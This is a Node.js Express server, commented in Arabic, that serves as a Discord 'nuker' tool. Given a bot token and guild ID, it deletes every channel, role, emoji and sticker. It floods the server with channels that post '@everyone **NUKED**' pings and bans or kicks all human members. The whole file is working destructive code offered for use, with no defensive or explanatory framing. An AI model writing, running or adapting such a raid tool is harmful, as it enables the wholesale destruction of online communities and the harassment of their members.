const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// نقطة اختبار للتأكد من أن الخادم يعمل
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running' });
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// نقطة تنفيذ الأوامر
app.post('/api/action', async (req, res) => {
    const { token, guildId, action, params } = req.body;
    
    // التحقق من البيانات
    if (!token || !guildId || !action) {
        return res.status(400).json({ error: 'Missing token, guildId, or action' });
    }

    const headers = {
        Authorization: `Bot ${token}`,
        'Content-Type': 'application/json'
    };

    try {
        let responseData = { success: true, message: '' };
        const baseURL = `https://discord.com/api/v10/guilds/${guildId}`;

        switch (action) {
            case 'deleteChannels':
                const channels = await axios.get(`${baseURL}/channels`, { headers });
                for (const channel of channels.data) {
                    if (channel.type === 0 || channel.type === 2 || channel.type === 5) {
                        await axios.delete(`${baseURL}/channels/${channel.id}`, { headers });
                    }
                }
                responseData.message = `Deleted ${channels.data.filter(c => [0,2,5].includes(c.type)).length} channels`;
                break;

            case 'createChannels':
                const { name: channelName, count: channelCount = 20 } = params;
                for (let i = 0; i < channelCount; i++) {
                    await axios.post(`${baseURL}/channels`, {
                        name: `${channelName || 'nuked-channel'}-${i+1}`,
                        type: 0
                    }, { headers });
                }
                responseData.message = `Created ${channelCount} text channels`;
                break;

            case 'createChannelsPing':
                const { name: pingName, count: pingCount = 20 } = params;
                for (let i = 0; i < pingCount; i++) {
                    const newChannel = await axios.post(`${baseURL}/channels`, {
                        name: `${pingName || 'ping-channel'}-${i+1}`,
                        type: 0
                    }, { headers });
                    await axios.post(`${baseURL}/channels/${newChannel.data.id}/messages`, {
                        content: '@everyone **NUKED**'
                    }, { headers });
                }
                responseData.message = `Created ${pingCount} channels with @everyone ping`;
                break;

            case 'deleteRoles':
                const roles = await axios.get(`${baseURL}/roles`, { headers });
                for (const role of roles.data) {
                    if (role.name !== '@everyone') {
                        await axios.delete(`${baseURL}/roles/${role.id}`, { headers });
                    }
                }
                responseData.message = `Deleted ${roles.data.filter(r => r.name !== '@everyone').length} roles`;
                break;

            case 'createRoles':
                const { roleName, roleCount = 20 } = params;
                for (let i = 0; i < roleCount; i++) {
                    await axios.post(`${baseURL}/roles`, {
                        name: `${roleName || 'nuked-role'}-${i+1}`
                    }, { headers });
                }
                responseData.message = `Created ${roleCount} roles`;
                break;

            case 'deleteEmojis':
                const emojis = await axios.get(`${baseURL}/emojis`, { headers });
                for (const emoji of emojis.data) {
                    await axios.delete(`${baseURL}/emojis/${emoji.id}`, { headers });
                }
                responseData.message = `Deleted ${emojis.data.length} emojis`;
                break;

            case 'deleteStickers':
                const stickers = await axios.get(`${baseURL}/stickers`, { headers });
                for (const sticker of stickers.data) {
                    await axios.delete(`${baseURL}/stickers/${sticker.id}`, { headers });
                }
                responseData.message = `Deleted ${stickers.data.length} stickers`;
                break;

            case 'banAll':
                const members = await axios.get(`${baseURL}/members?limit=1000`, { headers });
                let banned = 0;
                for (const member of members.data) {
                    if (!member.user.bot) {
                        await axios.put(`${baseURL}/bans/${member.user.id}`, {}, { headers });
                        banned++;
                    }
                }
                responseData.message = `Banned ${banned} members`;
                break;

            case 'kickAll':
                const membersKick = await axios.get(`${baseURL}/members?limit=1000`, { headers });
                let kicked = 0;
                for (const member of membersKick.data) {
                    if (!member.user.bot) {
                        await axios.delete(`${baseURL}/members/${member.user.id}`, { headers });
                        kicked++;
                    }
                }
                responseData.message = `Kicked ${kicked} members`;
                break;

            default:
                return res.status(400).json({ error: 'Invalid action' });
        }

        res.json(responseData);
    } catch (error) {
        console.error('Error:', error.response?.data || error.message);
        const errorMsg = error.response?.data?.message || error.message;
        res.status(500).json({ error: errorMsg });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
    console.log(`👉 Open your browser and go to http://localhost:${PORT}`);
});
